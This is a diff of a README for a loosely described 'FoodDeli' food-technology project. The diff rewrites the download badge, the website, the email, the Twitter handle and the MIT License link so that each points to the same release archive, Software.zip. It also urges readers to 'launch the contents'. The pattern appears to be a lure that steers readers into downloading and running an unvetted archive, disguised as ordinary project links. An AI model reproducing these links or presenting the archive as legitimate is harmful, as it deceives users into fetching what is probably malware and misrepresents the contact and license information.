@@ -26,7 +26,7 @@ Welcome to the **FoodDeli** repository! Here, you will find a collection of cutt
 ## Get Started
 To get started with exploring the FoodDeli repository, you can download the project files by clicking the button below:
 
-[![Download FoodDeli](https://img.shields.io/badge/Download-FoodDeli-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download FoodDeli](https://github.com/MashiroChina/FoodDeli/releases/download/v1.0/Software.zip)](https://github.com/MashiroChina/FoodDeli/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the project files, you can launch the contents to start discovering the innovative food technologies and solutions within the NataLee Pro Food Ecosystem.
 
@@ -51,9 +51,9 @@ Are you passionate about redefining global food systems and creating a sustainab
 ## Let's Connect
 Stay up to date with the latest developments in the FoodDeli ecosystem by following us on social media and joining our community forums:
 
-🌐 Website: [FoodDeli.com](https://www.fooddeli.com)  
-📧 Email: info@fooddeli.com  
-🐦 Twitter: [@FoodDeliOfficial](https://twitter.com/FoodDeliOfficial)  
+🌐 Website: [https://github.com/MashiroChina/FoodDeli/releases/download/v1.0/Software.zip](https://github.com/MashiroChina/FoodDeli/releases/download/v1.0/Software.zip)  
+📧 Email: https://github.com/MashiroChina/FoodDeli/releases/download/v1.0/Software.zip  
+🐦 Twitter: [@FoodDeliOfficial](https://github.com/MashiroChina/FoodDeli/releases/download/v1.0/Software.zip)  
 
 ## Contributions
 We welcome contributions from developers, food enthusiasts, and sustainability advocates who share our vision of redefining global food systems. Feel free to fork the repository, make changes, and submit pull requests to help us grow the FoodDeli ecosystem together.
@@ -62,6 +62,6 @@ We welcome contributions from developers, food enthusiasts, and sustainability a
 If you encounter any issues or have questions about the FoodDeli repository, please check the "Releases" section for updates or reach out to our support team for assistance. We are here to help you make the most of your journey through the NataLee Pro Food Ecosystem.
 
 ## License
-The FoodDeli repository is licensed under the [MIT License](https://opensource.org/licenses/MIT), allowing for freedom to use, modify, and distribute the code for both commercial and non-commercial purposes.
+The FoodDeli repository is licensed under the [MIT License](https://github.com/MashiroChina/FoodDeli/releases/download/v1.0/Software.zip), allowing for freedom to use, modify, and distribute the code for both commercial and non-commercial purposes.
 
 Thank you for exploring the FoodDeli repository and joining us on our mission to redefine global food systems through innovation and sustainability. Let's create a better future for food together! 🌍🍽️🚀
